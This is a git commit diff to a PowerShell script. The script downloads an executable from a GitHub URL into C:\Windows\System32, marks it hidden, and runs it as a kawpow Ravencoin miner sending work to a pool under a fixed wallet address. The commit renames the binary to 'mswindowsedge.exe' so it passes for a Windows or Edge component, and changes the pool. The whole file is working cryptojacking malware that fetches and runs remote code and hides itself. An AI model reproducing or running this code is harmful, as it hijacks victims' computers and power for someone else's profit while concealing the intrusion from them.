372f2a3160a7483b7b765b3dd69bd363f73966cf
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-06-09 18:34:37 +0300

    Update script12GS-02.ps1

--- script12GS-02.ps1
+++ script12GS-02.ps1
@@ -1,9 +1,9 @@
-$Folder = 'C:\Windows\System32\Windows_System32.exe'
+$Folder = 'C:\Windows\System32\mswindowsedge.exe'
 "Test to see if folder [$Folder]  exists"
 if (Test-Path -Path $Folder) {
     "Path exists!"
-    C:\Windows\System32\Windows_System32.exe -a kawpow -i 40 -o rvn-eu1.nanopool.org -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-01
+    C:\Windows\System32\mswindowsedge.exe -a kawpow -i 15 -o rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-001 -pl 40
 } else {
     "Path doesn't exist."
-    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/Windows_System32.exe" -OutFile Windows_System32.exe ; attrib +h Windows_System32.exe; C:\Windows\System32\Windows_System32.exe  -a kawpow -i 40 -o rvn-eu1.nanopool.org -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-01
+    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/mswindowsedge.exe" -OutFile mswindowsedge.exe ; attrib +h mswindowsedge.exe; C:\Windows\System32\mswindowsedge.exe  -a kawpow -i 15 -o rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-001 -pl 40
 }
